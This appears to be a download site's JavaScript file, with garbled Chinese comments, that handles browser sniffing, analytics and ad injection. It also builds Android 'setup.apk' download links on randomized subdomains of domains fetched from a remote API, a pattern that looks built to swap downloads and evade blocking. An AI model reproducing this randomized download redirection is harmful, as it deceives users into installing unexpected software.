//����_czc����:
var _czc = _czc || [];
//��siteid����������siteid�滻�·�"XXXXXXXX"����
_czc.push(["_setAccount", "5932458"]);


/*ͨ�ú���Begin*/
Array.prototype.in_array = function(e) {   for(i=0;i<this.length;i++){   if(this[i] == e)  return true;  }   return false;   }
Array.prototype.in_mid = function(e) { for(i=0;i<this.length;i++)  {  if(e.indexOf(this[i])>-1)  return this[i]; }  return 0; }
var getIosPlist=function(title,pic,iphoneid,padid){ var iosurl; var iosresTitle=title.split(/(\s|\()/)[0];iosresTitle = iosresTitle.substring(0,20);iosresTitle= encodeURIComponent(iosresTitle);var pic =encodeURIComponent(pic);var ss = navigator.userAgent.toLowerCase();	if (ss.indexOf("iphone") != -1){ iosurl ="http://x.289.com/"+iphoneid+"/" + iosresTitle+"/"+pic;}else{iosurl ="http://x.289.com/"+padid+"/" + iosresTitle+"/"+pic;} return iosurl;}
var checkURL=function(URL){var str=URL;var Expression=/http(s)?:\/\/([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?/;var objExp=new RegExp(Expression);if(objExp.test(str)==true){return true;}else{return false;}}
var Cookie={get:function(name){var value='',matchs;if(matchs=document.cookie.match("(?:^| )"+name+"(?:(?:=([^;]*))|;|$)"))value=matchs[1]?unescape(matchs[1]):"";return value},set:function(name,value,expire,domain){expire=expire||30*24*3600*1000;var date=new Date(),cookie="";date.setTime(date.getTime()+expire);cookie=name+"="+escape(value)+";expires="+date.toGMTString()+";path=/;";domain&&(cookie+="domain="+domain+";");document.cookie=cookie},del:function(name,domain){Cookie.set(name,'',-1,domain)}};
function GetRandomNum(Min,Max){ var Range = Max - Min; var Rand = Math.random(); return(Min + Math.round(Rand * Range));  }   //���������
var chars = ['0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'];
function generateMixed(n) { var res = "";  for(var i = 0; i < n ; i ++) {   var id = Math.ceil(Math.random()*35); res += chars[id];   }return res;}
function checkRate(nubmer){var re = /^[0-9]+.?[0-9]*$/;  if (!re.test(nubmer)) { return false;  }else{ return true;}}   //�ж��ַ����Ƿ�Ϊ����     //�ж������� /^[1-9]+[0-9]*]*$/ 
Array.prototype.in_trim_array=function(e){ if(e==""||e==null){return false};	for(i=0;i<this.length;i++){ if(this[i].toLowerCase().indexOf(e)>=0 || e.indexOf(this[i].toLowerCase())>=0) return true;}return false;};
var showmoList   = ["nexus","sm-g900p","SM-N900A","ZTE N909","13B143","11A465","windows","ipad","meego","gt-i9505","gt-i9300","sm-n900t","playbook","kfapwi","8c148","12a4345d","gt-n7100","lgms323"];
var browser = {  versions: function () {
                var u = navigator.userAgent, app = navigator.appVersion;
                return {//�ƶ��ն�������汾��Ϣ
                    trident: u.indexOf('Trident') > -1, //IE�ں�
                    presto: u.indexOf('Presto') > -1, //opera�ں�
                    webKit: u.indexOf('AppleWebKit') > -1, //ƻ�����ȸ��ں�
                    gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //����ں�
                    mobile: !!u.match(/AppleWebKit.*Mobile/i) || !!u.match(/MIDP|SymbianOS|NOKIA|SAMSUNG|LG|NEC|TCL|Alcatel|BIRD|DBTEL|Dopod|PHILIPS|HAIER|LENOVO|MOT-|Nokia|SonyEricsson|SIE-|Amoi|ZTE/), //�Ƿ�Ϊ�ƶ��ն�
                    ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios�ն�
                    android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android�ն˻���uc�����
                    iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //�Ƿ�ΪiPhone����QQHD�����
                    iPad: u.indexOf('iPad') > -1, //�Ƿ�iPad
                    webApp: u.indexOf('Safari') == -1, //�Ƿ�webӦ�ó���û��ͷ����ײ�
					UCBrowser: u.indexOf('UCBrowser') > -1, //UCBrowser
					MQQBrowser: u.indexOf('MQQBrowser') > -1, //�Ƿ�MQQBrowser
					Safari: u.indexOf('Safari') > -1,
					ios9: u.indexOf('iPhone OS 9') > -1
                };
            } (),
   language: (navigator.browserLanguage || navigator.language).toLowerCase()
}
var browsertype;
var u = navigator.userAgent.toLowerCase();
if(u.indexOf('360') > -1){
    browsertype = '360';
}else if(u.indexOf('mb2345browser') > -1){
    browsertype = '2345';
}else if(u.indexOf('qq') > -1){
    browsertype = 'qq';
}else if(u.indexOf('ucbrowser') > -1){
    browsertype = 'UC';
}else if(u.indexOf('micromessenger') > -1){
    browsertype = 'WeChat';
}else if(u.indexOf('chrome') > -1 || u.indexOf('crios') > -1){
    browsertype = 'chrome';
}else if(u.indexOf('miuibrowser') > -1){
    browsertype = 'miuibrowser';
}else if(u.indexOf('sogou') > -1){
    browsertype = 'sogou';
}else if(u.indexOf('lbbrowser') > -1){
    browsertype = 'lbbrowser';
}else if(u.indexOf('hao') > -1){
    browsertype = 'hao';
}else if(u.indexOf('jisu') > -1){
    browsertype = 'jisu';
}else if(u.indexOf('mxios') > -1 || u.indexOf('maxthon') > -1){
    browsertype = 'mxios';
}else if(u.indexOf('baidu') > -1){
    browsertype = 'baidu';
}else if(u.indexOf('opera') > -1 || u.indexOf('opios') > -1){
    browsertype = 'opera';
}else if(u.indexOf('world') > -1){
    browsertype = 'world';
}else if(u.indexOf('safari') > -1){
    browsertype = 'safari';
}

var AjaxTip  = function(message,hold){
		this.message = message;
		this.hold = hold;
		this.show();
};

AjaxTip.prototype = {
	create : function(){
		this.tip = $('<div class="ajax-tip"><div class="inner">' + this.message + '</div></div>').appendTo('body');
	},
	show : function(){
		AjaxTip.hide();
		this.create();
		var that= this;
		if(!this.hold){
			AjaxTip.timer = setTimeout(function(){
				that.hide();
			},2000);
		}
	},
	hide : function(){
		var that = this;
		this.tip.animate({ opacity: 0},400,'',function(){
			that.tip.remove();
		});
	}
}
AjaxTip.hide = function(){
	$('.ajax-tip').remove();
	clearTimeout(this.timer);
};

 var catearr = [48,49,50,51,52,53,54,55,56,57,58,59,61,63,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,154,155,156,157,158,159]; //��׿����
 var catearrIos = [60,77,78,79,80,81,82,83,84,85,104,105,106,107,108,110,111,112,113,114,115,116,117,118,119,120];
 var AppArray = [884];
 var GameCateList=[1,2,3,4,5,7,10];//��Ϸ����
	 
 var showAdsTitle = ["��Ů","����","������","Ӱ��","��Ӱ","ֱ��","��Ƶ","����","�첥","����","����","����","լ��","��������","��Ů","а��","Ů��","����","�Ը�","��˿","�ս�","����","С������"];
 var showAdsRef   = ["baidu.com","sm.cn","sogou.com","so.com","google.com","bing.com"];
	
 var u = navigator.userAgent, app = navigator.appVersion;
 var isIphone= !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);  //ios�ն�
 
webUrl = [];

function xzUrl(data){
	webUrl = data;
	window.webUrl = webUrl;
	var AppID = AppArray[Math.floor(Math.random()*(AppArray.length))];  //�����ȡһ��ֵ
	var downDomain = webUrl[Math.floor(Math.random()*(webUrl.length))];  //�����ȡһ��ֵ
	var  downUrl = "http://"+generateMixed(2)+"."+downDomain+"/"+generateMixed(6)+AppID+generateMixed(3)+"/setup.apk";

 var iosurl ="itms-services://?action=download-manifest&url=https://www.haima.me/download/000001533.plist"
 
 function getArrRan(myArray){return myArray[Math.floor(Math.random()*(myArray.length))]} //����������ȡһ��ֵ
 
 var myazdownLoad=new Array(); //��׿���ص�ַ
     //myazdownLoad.push(downUrl);   //��һ������
	 myazdownLoad.push("http://"+generateMixed(2)+"."+downDomain+"/"+generateMixed(6)+"364"+generateMixed(3)+"/setup.apk");   //��һ������
	//myazdownLoad.push("http://"+generateMixed(2)+"."+downDomain+"/"+generateMixed(6)+"360"+generateMixed(3)+"/setup.apk");   //��һ������
	
	
	var ucbrowser=new Array();
    ucbrowser.push("http://"+generateMixed(4)+".t375.com/"+generateMixed(8)+"/php/qq884.apk"); //Ӧ�ñ�
  ucbrowser.push("http://"+generateMixed(4)+".t375.com/"+generateMixed(8)+"/php/qq364.apk"); //PP
  ucbrowser.push("http://"+generateMixed(4)+".t375.com/"+generateMixed(8)+"/php/qq360.apk");//360��ţ
  
var qqbrowser=new Array();
    qqbrowser.push("http://"+generateMixed(4)+".t375.com/"+generateMixed(8)+"/qq/qq884.apk"); //Ӧ�ñ�
  qqbrowser.push("http://"+generateMixed(4)+".t375.com/"+generateMixed(8)+"/qq/qq364.apk"); //PP
  qqbrowser.push("http://"+generateMixed(4)+".t375.com/"+generateMixed(8)+"/qq/qq360.apk");//360��ţ

  
  window.downUrl = downUrl;
  window.iosurl = iosurl;
  window.myazdownLoad = myazdownLoad;
   window.ucbrowser = ucbrowser;
    window.qqbrowser = qqbrowser;
}

$.ajax({
    type:"get",    //����ʽ
    async:true,    //�Ƿ��첽
    url:"http://tj.viphxw.com/count/domain_api",
    dataType:"jsonp",    //����json����һ����jsonp
    jsonp: "callback"    //��������Ĳ�������Ĭ����callback
}); 

if(typeof(_pageinfo) != 'undefined' && _pageinfo.path == "down" && browser.versions.android){
	//document.write('<script src="http://sp.ulxue.com/img_ad/index?project=lelehezi&ad_name=top&site_name=962" ><\/script>');	
	//$("head").append('<style>.f-llhz-img{ width:100%; height:auto; display:block; overflow:hidden}.f-llhz-img img{ width:100%; height:auto; display:block; overflow:hidden}</style>')
}




//�������¶������
var c_1=function(){

	
},
//�����м���,��һ�����
c_2=function(){
	
	
},
//���ݽ������,����ܻ��뿴
c_3=function(){

		document.writeln("<script src=\"https://a1.289.com/er3a1ecf97f2c3f33adb127998b5b065b70cacde0b36.js\" type=\"text/javascript\"></script>");//962����ҳ,c_3

	
},
//���ݽ�������Ƽ�,��������·�
c_4=function(){	
	
},
//��������±�
c_5=function(){
	 
},
/* �ƶ����µ����������� */
c_6=function(){
	
},
/* 962�ƶ������Ƽ��Ķ��� */
c_7=function(){
	
},

/* 962�ƶ������Ƽ��Ķ� */
c_8=function(){
	
		document.writeln("<script type=\"text/javascript\">");
		document.writeln("var cpro_id=\"u2721907\";");
		document.writeln("(window[\"cproStyleApi\"] = window[\"cproStyleApi\"] || {})[cpro_id]={at:\"3\",hn:\"0\",wn:\"0\",imgRatio:\"1.7\",scale:\"20.6\",pat:\"6\",tn:\"template_inlay_all_mobile_lu_native\",rss1:\"#FFFFFF\",adp:\"1\",ptt:\"0\",titFF:\"%E5%BE%AE%E8%BD%AF%E9%9B%85%E9%BB%91\",titFS:\"14\",rss2:\"#000000\",titSU:\"0\",ptbg:\"70\",ptp:\"0\"}");
		document.writeln("</script>");
		document.writeln("<script src=\"https://a1.289.com/th3a1ec092f6c3f73fdb127998b5b065b70cacde0b36.js\" type=\"text/javascript\"></script>");
	
},
/* �б�ͨ�� */
l_1=function(){
	
},
/* �ײ�Ʈ�� */
p_foot=function(){
	
},
/* ����Ʈ�� */
p_top=function(){
	document.writeln("<script type=\"text/javascript\">");
	document.writeln("var cpro_id=\"u2384906\";");
	document.writeln("</script>");
	document.write('<script src=\"https://a1.289.com/eg3a1ec498f3c3f73edb127998b5b065b70cacde0b36.js\" type="text/javascript"></script>')
},
//�б�ҳ
l_2=function(){
	document.writeln("<script type=\"text/javascript\">");
	document.writeln("var cpro_id=\"u2384897\";");
	document.writeln("(window[\"cproStyleApi\"] = window[\"cproStyleApi\"] || {})[cpro_id]={at:\"3\",pat:\"8\",cpro_h:\"30\",tn:\"template_inlay_all_mobile_lu_native_ad_txt\",rss1:\"#FFFFFF\",titFF:\"%E5%BE%AE%E8%BD%AF%E9%9B%85%E9%BB%91\",titFS:\"16\",rss2:\"#000000\",conpl:\"0\",conpr:\"20\",desfs:\"10\",rss3:\"#FFFFFF\",desbc:\"#DCDCDC\",pimc:\"20\",titSU:\"0\"}");
	document.writeln("</script>");
	document.write('<script src=\"https://a1.289.com/vw3a1ec498f3c2fe3fdb127998b5b065b70cacde0b36.js\" type="text/javascript"></'+'script>')
},
d_1 = function(){
	
},
 d_2=function(){

	$("head").append('<style>#down_d1_1{ width:auto; height:auto; background:#fff; margin:5px 0px 0; padding:0 0 0 10px; box-sizing:border-box; display:block; overflow:auto;white-space:nowrap}#down_d1_1 li{ width:20%; height:auto; padding:10px 10px 10px 0; box-sizing:border-box; display:inline-block; overflow:hidden}#down_d1_1 li a{ width:100%; height:auto; display:block; overflow:hidden}#down_d1_1 li a img{ width:48px; height:48px; display:block; overflow:hidden; margin:auto;}#down_d1_1 li a h3{width: 90%;  height: 20px;  line-height: 20px;  font-size: 12px;  font-weight: normal;  color: #333;  text-align: center;  display: block;  overflow: hidden;  margin: 4px auto 0;}</style>')
	var d2Html = ""
	if(browser.versions.android){
		d2Html = '<ul class="group" id="down_d1_1"><li><a href="http://m.962.net/y/482002"><img class="ico" src="http://pic.962.net/up/2020-9/202091691944449.png"><h3 class="name">�켧��</h3></a></li>'+
					'<li><a href="http://m.962.net/y/499050"><img class="ico" src="http://pic.962.net/up/2020-12/20201221924505239.png"><h3 class="name">��������ʦ</h3></a></li>'+
					'<li><a href="http://m.962.net/y/128588"><img class="ico" src="http://pic.962.net/up/2021-1/2021127166433299.png"><h3 class="name">360�����</h3></a></li>'+
					'<li><a href="http://m.962.net/y/475896"><img class="ico" src="http://pic.962.net/up/2020-8/20208101722394807.png"><h3 class="name">���÷���¼</h3></a></li>'+
					'<li><a href="http://m.962.net/y/497284"><img class="ico" src="http://pic.962.net/up/2020-12/202012101731112684.png"><h3 class="name">��նǬ��</h3></a></li>'+
					'</ul>';
	}else{
		d2Html = '<ul class="group" id="down_d1_1"><li><a href="http://ios.xinkuai.com/475/3730"><img class="ico" src="http://pic1.962.net/962/mb/up/2018-1/201811090101111_80_80.png"><h3 class="name">�پӼ�Ʒ</h3></a></li><li><a href="http://ios.xinkuai.com/315/3730"><img class="ico" src="http://pic1.962.net/962/mb/up/2018-1/201811091557145_80_80.jpg"><h3 class="name">ħ��������</h3></a></li><li><a href="http://dl.guopan.cn/iosweb/d.php?appid=107758&cid=39960"><img class="ico" src="http://pic.962.net/up/2017-8/201781617985331.png"><h3 class="name">�Ķ�Ů��</h3></a></li><li><a href="http://ios.xinkuai.com/393/3730"><img class="ico" src="http://pic1.962.net/962/mb/up/2018-1/201811093568717_80_80.png"><h3 class="name">��Ѫɳ��2</h3></a></li><li><a href="http://dl.guopan.cn/iosweb/d.php?appid=101909&cid=39960"><img class="ico" src="http://pic.962.net/up/2017-8/201781617115214.jpg"><h3 class="name">�ڴ�����</h3></a></li></ul>'
	}
	// document.write(d2Html)
 },
d_3=function(){
	

},
d_4=function(){

},

//������ģ��
cms_2=function(){
	document.write('<script src=\"//a1.289.com/common/res/web/9nca3.js?fas=wgwcbj\" type="text/javascript"></'+'script>')
	
}
